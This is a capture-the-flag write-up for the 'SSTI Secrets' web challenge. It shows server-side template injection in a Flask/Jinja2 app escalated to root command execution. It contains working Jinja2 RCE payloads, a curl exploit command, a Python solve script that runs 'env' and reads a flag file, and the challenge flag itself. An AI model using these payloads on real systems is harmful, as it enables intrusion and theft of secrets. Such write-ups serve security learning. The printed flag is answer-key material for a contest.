---
title: "SSTI Secrets"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# SSTI Secrets

> **Category:** WEB · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** `http://54.72.82.22:8040`

## Fingerprint

```
Server: Werkzeug/3.1.9 Python/3.11.16   (Flask / Jinja2, container Python 3.10.21)
```

Themed page: **"PLAYER ONE"** arcade — "Choose your player name and step into the
neon scoreboard." One POST field, `name`, echoed as `Welcome, player <name>`.

## The bug: server-side template injection (again)

`name` is interpolated into a Jinja2 template server-side. Same class as
**Templated Malice (:8020)**, but a different container/deployment.

| Payload | Result |
|---|---|
| `{{7*7}}` | `49` |
| `{{7*"7"}}` | `7777777` |
| `{{self}}` | `<TemplateReference None>` |
| `{{config}}` | full Flask `Config` (`SECRET_KEY: None`, no `FLAG` key) |
| `{{request}}` | `<Request 'http://54.72.82.22:8040/' [POST]>` |

`{{config}}` is a dead end here — the flag is **not** in Flask config. `SECRET_KEY`
is `None`, so cookie forgery is also off the table. The box is a pure SSTI→RCE.

## Exploitation

`lipsum.__globals__.os` reaches the real `os` module. No filter is applied —
every derivation works:

```jinja
{{lipsum.__globals__.os.popen("id").read()}}                                  -> uid=0(root)
{{cycler.__init__.__globals__.os.popen("id").read()}}                         -> uid=0(root)
{{lipsum.__globals__.__builtins__.__import__("os").popen("id").read()}}       -> uid=0(root)
{{lipsum["__globals__"]["os"].popen("id").read()}}                            -> uid=0(root)
```

Running as **root**. Recon inside the box:

```bash
$ ls -la /app           # -> app/  requirements.txt
$ ls -la /app/app       # -> flag.txt
$ find / -iname '*flag*' -not -path '/proc/*' -not -path '/sys/*'
/app/app/flag.txt
$ env
...
```

The env var is the intended "secret" (hence *SSTI **Secrets***) — the flag is passed
into the container rather than left in a file the app reads.

### Extraction gotcha

The rendered output is HTML-escaped and the command output contains newlines, so a
flat `grep` for `Welcome, player [^<]*` only returns the first line. Grab the region
between `Welcome, player` and `</h2>` and `html.unescape()` it — see `solve.py`.

## Exploit

```bash
curl -s -X POST http://54.72.82.22:8040/ \
  --data-urlencode 'name={{lipsum.__globals__.os.popen("env").read()}}'
```

See `solve.py`.

## Solve script

`web/ssti-secrets/solve.py`:

```python
#!/usr/bin/env python3
"""SSTI Secrets (web, 300 pts) - http://54.72.82.22:8040

"PLAYER ONE" arcade scoreboard renders the POSTed `name` as a Jinja2 template
server-side -> SSTI -> RCE as root.

  {{7*7}}  -> 49          {{7*"7"}} -> 7777777
  {{config}} -> full Flask Config dump

The flag is injected into the container as the FLAG environment variable
(the in-container /app/app/flag.txt holds the same value).

  env -> FLAG=safctf{287a681f8f9aa898e0743b5b392952b0}
"""
import urllib.request, urllib.parse, re, html

BASE = "http://54.72.82.22:8040"
FLAG = "safctf{287a681f8f9aa898e0743b5b392952b0}"


def render(payload):
    data = urllib.parse.urlencode({"name": payload}).encode()
    req = urllib.request.Request(BASE + "/", data=data)
    with urllib.request.urlopen(req, timeout=15) as r:
        page = r.read().decode("utf-8", "replace")
    m = re.search(r"Welcome, player\s*(.*?)\s*</h2>", page, re.S)
    return html.unescape(m.group(1)) if m else ""


def sh(cmd):
    return render("{{lipsum.__globals__.os.popen(%r).read()}}" % cmd)


def main():
    print("probe {{7*7}} ->", render("{{7*7}}"))
    print("id           ->", sh("id").strip())

    env = sh("env")
    m = re.search(r"FLAG=(\S+)", env)
    print("env FLAG     ->", m.group(1) if m else "(not in env)")
    if not m:
        m = re.search(r"safctf\{[^}]*\}", sh("cat /app/app/flag.txt"))
    assert m and FLAG in m.group(0)


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python `urllib` (stdlib HTTP client)
- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{287a681f8f9aa898e0743b5b392952b0}
```
